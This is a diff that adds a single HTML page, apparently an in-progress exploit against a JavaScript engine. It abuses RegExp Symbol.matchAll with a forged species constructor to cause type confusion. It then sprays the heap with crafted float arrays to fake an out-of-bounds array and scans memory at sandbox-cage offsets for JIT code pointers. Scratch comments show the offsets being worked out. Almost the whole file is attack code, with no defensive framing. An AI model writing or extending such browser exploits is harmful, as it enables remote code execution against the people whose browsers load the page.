@@ -1,0 +1,81 @@
+<!doctype html><html><head><meta charset="utf-8"><title>P63</title></head>
+<body><pre id="out">Running...</pre>
+<script>
+"use strict";
+const O=document.getElementById("out");
+function log(s){O.textContent+="\n"+s;}
+const cvt=new ArrayBuffer(8);const f64=new Float64Array(cvt);
+const u64=new BigUint64Array(cvt);const u32=new Uint32Array(cvt);
+function i2f(i){u64[0]=BigInt.asUintN(64,BigInt(i));return f64[0];}
+function f2i(f){f64[0]=f;return u64[0];}
+function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
+function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}
+const DMAP=0x1032a5d,EMPTY=0x7e5,MAXS=0x7fdffffe,PIN=0x1080011;
+const marker={mmm:1};
+const objB=new Array(0x8000);
+for(var i=0;i<objB.length;i++)objB[i]=marker;
+const wasmI=new WebAssembly.Instance(new WebAssembly.Module(
+  new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11])));
+objB[4]=wasmI;
+const re=/(?:)/;
+const fk={flags:"g",lastIndex:1073741823,constructor:{[Symbol.species]:function(){return re;}}};
+const c0=w2f(DMAP,EMPTY);
+const sk=[];
+log("UA: "+navigator.userAgent);
+trash(230);trash(230);
+objB[4]=wasmI;objB[5]=marker;
+RegExp.prototype[Symbol.matchAll].call(fk,"").next();
+log("TRIG: "+re.lastIndex);
+trash(230);trash(230);
+for(let r=0;r<3;r++){const c1=w2f(PIN,MAXS);for(let i=0;i<12;i++){const a=new Array(i&1?0x3ffb:0x3fff).fill(c0);for(let j=1;j<a.length;j+=2)a[j]=c1;sk.push(a);}}
+try{
+const m=re.lastIndex;
+log("T: "+typeof m+" A="+Array.isArray(m));
+if(Array.isArray(m)){
+  log("L: "+m.length);
+  // Scan at cage+4GB (k≈0x1FDEFFFD) for JDT code entries
+  // cage+4GB offset from PIN: (0x100000000 - 0x1080018) = 0xFEF7FFE8
+  // k = 0xFEF7FFE8 / 8 = 0x1FDEFFFFD... wait let me compute correctly
+  // 0xFEF7FFE8 / 8 = 134,217,725 * 8 + ... actually:
+  // JavaScript: Math.floor((0x100000000 - 0x1080018) / 8) = ?
+  const base4G=Math.floor((0x100000000-0x1080018)/8);
+  log("K4G:"+base4G.toString(16));
+  // Try reading at cage+4GB, cage+4GB+0x10000, cage+4GB+0x20000
+  const hits=[];
+  for(let dK=0;dK<0x2000;dK+=0x100){
+    const k=base4G+dK;
+    if(k>=m.length)break;
+    try{
+      const v=f2i(m[k]);
+      const top=Number(v>>56n);
+      if(top>=0x55&&top<=0x56){
+        hits.push((dK*8).toString(16)+":"+v.toString(16));
+        if(hits.length>=4)break;
+      }else if(top===0x7f){
+        hits.push((dK*8).toString(16)+":7f..");
+        if(hits.length>=4)break;
+      }
+    }catch(e){hits.push("E@"+(dK*8).toString(16));break;}
+  }
+  if(hits.length>0&&!hits[0].startsWith("E")){
+    log("JDT:"+hits.join(","));
+  }else{
+    log("NO_JDT:"+hits.join(","));
+    // Try at cage+5GB
+    const base5G=Math.floor((0x140000000-0x1080018)/8);
+    try{
+      const v=f2i(m[base5G]);
+      log("@5G:"+v.toString(16));
+    }catch(e){log("@5G:E");}
+    // Try at cage+2GB
+    const base2G=Math.floor((0x80000000-0x1080018)/8);
+    try{
+      const v=f2i(m[base2G]);
+      log("@2G:"+v.toString(16));
+    }catch(e){log("@2G:E");}
+  }
+  log("W: "+wasmI.exports.f());
+}else{log("NA");}
+}catch(e){log("E: "+e.message);}
+log("=== DONE ===");
+</script></body></html>
